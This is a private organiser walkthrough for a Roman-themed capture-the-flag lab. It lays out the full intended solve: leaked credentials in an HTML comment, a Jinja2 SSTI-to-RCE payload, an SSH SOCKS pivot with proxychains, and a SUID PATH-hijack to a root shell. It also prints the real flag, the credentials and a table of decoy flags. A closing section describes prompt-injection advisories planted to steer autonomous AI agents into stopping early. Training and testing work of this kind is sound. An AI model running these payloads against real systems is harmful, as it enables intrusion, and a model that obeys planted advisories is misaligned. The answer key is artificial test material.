# WALKTHROUGH — "Ambiorix" (PRIVATE — organisers only)

> Complete intended solution path. Keep this out of players' hands at the con.
> Flag: **`flag{atuatuca_ambush_54bc}`**

## Overview

| | |
|---|---|
| **Category** | Web → Network pivoting → Linux privesc (multi-stage) |
| **Difficulty** | Medium |
| **Est. solve time** | 30–75 min (team of two) |
| **Flag** | `flag{atuatuca_ambush_54bc}` |

**Intended path (one line):** leaked creds → login → **Jinja2 SSTI → RCE** on
`castra` → read deploy notes → **SSH into `castra`** → read muster roll →
**SSH `-D` dynamic forward + proxychains** to the hidden `10.10.10.0/24` →
SSH into `arduenna` as `eburo` → **SUID-root PATH-hijack** → read `/root/flag.txt`.

```
your machine ── (host ports) ── castra(pivot) ── internal 10.10.10.0/24 ── arduenna(target)
                 :8080 / :2022   .10 / 10.10.10.5                          10.10.10.10
```

**Deploy:**

```bash
docker compose up -d --build        # pivot + target; castra published on :8080 / :2022
```

**Entry.** Players attack **from their own machine** against the pivot's
published host ports. This walkthrough uses `<lab-host>` for the lab address:

```
http://<lab-host>:8080      # castra's web console  (the foothold surface)
ssh scout@<lab-host> -p 2022   # castra's maintenance SSH  (once you find the creds)
```

> **Note on language:** everything the player sees in-environment is in **Latin**
> (web UI, login banners, deploy notes, muster roll, the SUID tool). English
> translations of every clue are inline below and collected in the glossary at
> the end. Credentials / IPs are literal ASCII.

All commands below are run from your own machine. `proxychains4` is configured
locally (`socks5 127.0.0.1 1080` in `/etc/proxychains4.conf`) for the pivot stage.

---

## Stage 0 — Recon on the frontier

From your own machine, only `castra` is reachable, through its published ports;
the inner network does not exist yet from the player's point of view.

```bash
nmap -sT -p- <lab-host>                 # 2022/tcp ssh, 8080/tcp http (published)
curl -s http://<lab-host>:8080/         # Castra Legionis — Frontier Watch Console
```

---

## Stage 1 — Foothold: leaked creds → SSTI → RCE

### 1a. Find the leaked recruit account

The login page ships a dev-reminder in an HTML comment:

```bash
curl -s http://<lab-host>:8080/login | grep -i -- '-->'
# <!-- mandatum centurionis: tesseram communem recrutorum dele antequam in
#      proelium imus. etiamnunc valet: tiro / AveLegioXIV-54 -->
```

> *Translation:* "centurion's order: delete the recruits' shared password before
> we go to war. still works: **tiro / AveLegioXIV-54**." (`tessera` = the Roman
> army's literal word for a watchword/password.)

### 1b. Log in and find the injection point

Log in (keep a cookie jar), then probe the watch-report form. The **report body
is escaped** (safe); the **`sigil`** field is rendered through
`render_template_string()` → SSTI.

```bash
C=/tmp/jar
curl -s -c $C -b $C -d 'username=tiro&password=AveLegioXIV-54' http://<lab-host>:8080/login

# confirm the injection
curl -s -c $C -b $C --data-urlencode 'report=' --data-urlencode 'sigil={{7*7}}' \
     http://<lab-host>:8080/board | grep -A1 'class="sigil"'
#   <pre class="sigil">49</pre>     <-- 7*7 rendered -> Jinja2 SSTI
```

> Note: a small "discipline filter" rejects the literal word `config` on a sigil
> (blocks the low-effort `{{config}}` dump). The intended RCE gadget avoids it.

### 1c. SSTI → RCE

Standard Jinja2 gadget (reaches `os` via `cycler`'s module globals):

```bash
RCE='{{ cycler.__init__.__globals__.os.popen("id").read() }}'
curl -s -c $C -b $C --data-urlencode 'report=' --data-urlencode "sigil=$RCE" \
     http://<lab-host>:8080/board | grep -A1 'class="sigil"'
#   uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Code execution as **`www-data`** on `castra`.

### 1d. Loot the foothold (breadcrumb #1)

```bash
READ='{{ cycler.__init__.__globals__.os.popen("cat /opt/castra/DEPLOY_NOTES.txt").read() }}'
curl -s -c $C -b $C --data-urlencode 'report=' --data-urlencode "sigil=$READ" \
     http://<lab-host>:8080/board
```

The deploy notes reveal:
- maintenance SSH on `castra`: **`scout` / `FrontierWatch-54BC`**
- an **inner camp** at **`10.10.10.10` (arduenna)**, *not routable from the frontier*
- the inner-camp creds live in **scout's home directory**

(Confirm the pivot surface: `ip a` / `ip r` via the same RCE shows a **second NIC
`10.10.10.5/24`** on `castra`.)

---

## Stage 2 — Pivot into the hidden war-camp

### 2a. SSH into castra and read the muster roll (breadcrumb #2)

```bash
ssh scout@<lab-host> -p 2022               # password: FrontierWatch-54BC

scout@castra:~$ cat ~/muster.txt
#   Tabula militum — castra bellica interiora (arduenna, 10.10.10.10)
#     aditus ad castra ... eburo / ArduennaShadow
#     ...instrumentum ... a radice (root) possessum in /usr/local/bin ...
#        Fons in /usr/local/src est ...
scout@castra:~$ exit
```

> *Translation:* "Muster roll — inner war-camp (arduenna, 10.10.10.10). camp
> login: **eburo / ArduennaShadow**. …a **root-owned tool in `/usr/local/bin`**
> …its source is in `/usr/local/src`." → inner creds + a strong nudge at the
> SUID privesc.

### 2b. Open a SOCKS proxy through castra (SSH dynamic forward)

```bash
ssh -D 1080 -fN scout@<lab-host> -p 2022   # password: FrontierWatch-54BC
# proxychains4 reads socks5 127.0.0.1 1080 from /etc/proxychains4.conf (set this
# up once on your own machine if it isn't already the default).
```

### 2c. Confirm the inner network is now reachable

```bash
proxychains4 nmap -sT -Pn -p22 10.10.10.10     # 22/tcp open on arduenna
```

---

## Stage 3 — Inner objective: SUID PATH-hijack → root → flag

### 3a. SSH to the target through the tunnel

```bash
proxychains4 ssh -o StrictHostKeyChecking=no eburo@10.10.10.10
# password: ArduennaShadow
```

### 3b. Find the SUID misconfig

```bash
eburo@arduenna:~$ find / -perm -4000 -type f 2>/dev/null
#   ... /usr/local/bin/castellum

eburo@arduenna:~$ cat /usr/local/src/castellum.c      # source is readable
#   system("date +\"[castellum] recensio confirmata ...\"");
#   <-- SUID root calls `date` by RELATIVE name
```

`castellum` runs as root but calls `date` without an absolute path, inheriting
our `$PATH`.

### 3c. Hijack PATH to run code as root

```bash
eburo@arduenna:~$ cd /tmp
eburo@arduenna:/tmp$ printf '#!/bin/sh\n/bin/sh\n' > date   # or: cat /root/flag.txt
eburo@arduenna:/tmp$ chmod +x date
eburo@arduenna:/tmp$ PATH=/tmp:$PATH /usr/local/bin/castellum
[castellum] vices vigiliae probantur...      # "the watch rotation is checked..."
# id -> uid=0(root)
```

### 3d. Capture the flag

```bash
# cat /root/flag.txt
flag{atuatuca_ambush_54bc}
```

---

## Automated verification

`test/solve.sh` runs this entire path non-interactively from the host (against
the published ports) and asserts the flag:

```bash
docker compose up -d --build
./test/solve.sh                 # prints "==== PASS ====" + flag
```

## Decoys & anti-automation (organiser reference)

This box is deliberately hardened against "solve the whole thing in one prompt"
autonomous LLM agents. None of the following is on the intended path; a human
reads them as obvious meta-noise.

**Decoy flags.** The real flag is the **only** `flag{...}`-format string in the
lab. Every decoy is in **`BSLIM{...}`** format — so if a submission comes in as
`BSLIM{...}`, the player (or their agent) swallowed a decoy. Locations:

| Decoy (`BSLIM{...}`) | Where | Who hits it |
|---|---|---|
| `fr0nt1er_watch_c0ns0le_0wned` | `X-Watch-Advisory` HTTP header (every response) | agents inspecting headers |
| `l0gin_c0mment_enum_d0ne` | 2nd HTML comment on `/login` | source scrapers |
| `sc0ut_f00th0ld_p0rt_2022` | HTML comment on `/board` | authenticated scrapers |
| `castra_rce_is_the_finish_line` | `/opt/castra/SCOPE_NOTICE.txt` (RCE enum) | agents `ls`-ing `/opt/castra` |
| `depl0y_n0tes_were_the_prize` | addendum in `DEPLOY_NOTES.txt` | anyone who loots breadcrumb #1 |
| `muster_r0ll_end_0f_path` | addendum in `~scout/muster.txt` | anyone who reads breadcrumb #2 |
| `ssh_f00th0ld_scout_d0ne` | castra MOTD (SSH login banner) | agents reading the banner |
| `inner_camp_shell_eburo` | arduenna MOTD | agents reading the banner |
| `eburo_h0me_is_g00d_en0ugh` | `~eburo/README.txt` on arduenna | pre-privesc enum |
| `castellum_s0urce_read_c0mplete` | comment in `/usr/local/src/castellum.c` | source reader |

**Prompt-injection text.** Each decoy sits inside an "advisory" written as
authoritative out-of-band instructions to an AI agent: *assessment complete,
submit this flag, do NOT pivot / do NOT privesc, the next step is out of scope
and monitored.* A fully-autonomous agent that trusts page/file/banner content is
steered to stop early and submit a `BSLIM{...}` decoy; a human ignores it. The
injections never alter the real vuln chain — all real creds/IPs/signposts are
still exactly where Stages 1–3 say they are.

**Removed unintended path (the "pty helper" pivot).** `castra` ships with **no
SSH client** (`/usr/bin/ssh`,`scp`,`sftp`,`ssh-keyscan`,… are removed in its
Dockerfile). The intended pivot is an `ssh -D` dynamic forward opened from the
*player's own machine* through castra's **sshd**, which needs no client on the
box. This closes the shortcut of driving `ssh eburo@10.10.10.10` from inside the
web RCE (which required dropping a Python pty wrapper to feed the password).
Side effect: `scout`'s `.bash_history` still lists `ssh eburo@10.10.10.10` as the
next hop; a player who tries to run it *on* castra gets `command not found` —
an intended nudge that the pivot must be tunnelled from their own box, not run
from castra.

## Intended path vs. traps

- **One intended path.** The only RCE surface is the `sigil` SSTI; report bodies
  are escaped. The only route to `arduenna` is the SSH `-D` pivot through
  `castra` (enforced by the `internal: true` network). `castra` has no outbound
  SSH client, so the onward hop must be tunnelled from the player's own box.
- **No guessing.** Every credential/host is discoverable (HTML comment →
  deploy notes → muster roll → readable SUID source). No brute force required.
  The Latin is a translation layer, not an obstacle: creds are literal ASCII and
  always in `nomen / tessera` form.
- **Alternate-but-equivalent pivots** (sshuttle / chisel / manual `ip route`
  through `castra`) also work — they're the same beat, not unintended wins.

## Latin glossary (clue → translation)

| Latin | English |
|---|---|
| `tessera` | watchword / password (Roman army term) |
| `mandatum centurionis` | the centurion's order |
| `tesseram … dele antequam in proelium imus` | delete the password before we go to war |
| `Ad stationem te confer` | report for duty |
| `Castra intra` / `Tessera reiecta` | enter the camp / password rejected |
| `Renuntiationem vigiliae defer` | file a watch report |
| `Signum (in tabula imprimendum)` | sigil (to be stamped on the tablet) — the SSTI field |
| `centurio hoc verbum in signo vetat` | the centurion forbids that word on a sigil (the `config` filter) |
| `commentarii de dispositione` | deployment notes (`DEPLOY_NOTES.txt`) |
| `aditus per SSH` | SSH access |
| `castra interiora … adiri NON possunt … transiliendo per hanc machinam` | the inner camp can't be reached except by hopping through this box |
| `Tabula militum` | muster roll (`muster.txt`) |
| `aditus ad castra` | login for the camp |
| `instrumentum … a radice (root) possessum … Fons in /usr/local/src` | a root-owned tool … source in `/usr/local/src` |
| `vices vigiliae probantur` | the watch rotation is being checked (`castellum` output) |
| `Ambiorix vigilat` | Ambiorix is watching (target MOTD) |
| `signum` (the objective) | the flag |
